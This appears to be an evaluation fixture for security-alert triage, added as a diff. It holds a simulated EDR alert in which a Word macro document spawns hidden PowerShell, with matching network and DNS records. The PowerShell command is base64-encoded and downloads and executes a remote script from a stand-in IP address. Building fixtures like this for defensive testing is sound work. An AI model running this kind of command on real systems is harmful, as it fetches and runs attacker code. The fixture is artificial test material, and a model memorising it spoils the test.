@@ -1,0 +1,55 @@
+{
+ "alert_id": "EVAL-01",
+ "title": "Office application spawned PowerShell",
+ "source": "EDR",
+ "host": "WS-ACC-14",
+ "description": "Child process of WINWORD.EXE matched a suspicious-parent rule.",
+ "process_events": [
+  {
+   "timestamp": "2026-11-10T14:00:00Z",
+   "pid": 2000,
+   "ppid": 640,
+   "image": "C:\\Windows\\explorer.exe",
+   "command_line": "C:\\Windows\\Explorer.EXE",
+   "user": "CORP\\mlee"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:20Z",
+   "pid": 3100,
+   "ppid": 2000,
+   "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "command_line": "WINWORD.EXE /n \"C:\\Users\\mlee\\Downloads\\invoice_2211.docm\"",
+   "user": "CORP\\mlee"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:31Z",
+   "pid": 3300,
+   "ppid": 3100,
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhAC4AcABzADEAJwApAA==",
+   "user": "CORP\\mlee"
+  }
+ ],
+ "network_connections": [
+  {
+   "timestamp": "2026-11-10T14:00:33Z",
+   "pid": 3300,
+   "src_ip": "10.20.1.25",
+   "dst_ip": "203.0.113.50",
+   "dst_port": 80,
+   "protocol": "tcp",
+   "bytes_out": 420,
+   "bytes_in": 41000,
+   "domain": "update.invalid-cdn.example"
+  }
+ ],
+ "dns_queries": [
+  {
+   "timestamp": "2026-11-10T14:00:32Z",
+   "query": "update.invalid-cdn.example",
+   "response_ips": [
+    "203.0.113.50"
+   ]
+  }
+ ]
+}
